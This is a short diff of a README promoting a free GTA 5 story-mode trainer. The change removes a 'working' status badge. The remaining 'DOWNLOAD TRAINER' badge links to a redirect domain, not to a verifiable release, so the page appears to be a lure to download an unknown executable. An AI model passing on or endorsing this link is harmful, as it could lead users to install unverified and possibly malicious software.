@@ -5,7 +5,6 @@
 ### GTA 5 trainer: god mode • add money • spawn any car • weather & time control — free, story mode.
 
 [![Download](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD_TRAINER-red?style=for-the-badge&logo=github)](https://redirectify.lol)
-[![Status](https://img.shields.io/badge/STATUS-WORKING_%F0%9F%9F%A2-August_2026-brightgreen?style=for-the-badge)](#features)
 [![Key System](https://img.shields.io/badge/KEY-NO_KEY_required-success?style=for-the-badge)](#features)
 [![Platform](https://img.shields.io/badge/PLATFORM-Windows_10_%E2%80%A2_11-blue?style=for-the-badge)](#requirements)
 [![Menu](https://img.shields.io/badge/MENU-F1_HOTKEY-important?style=for-the-badge)](#how-to-use)
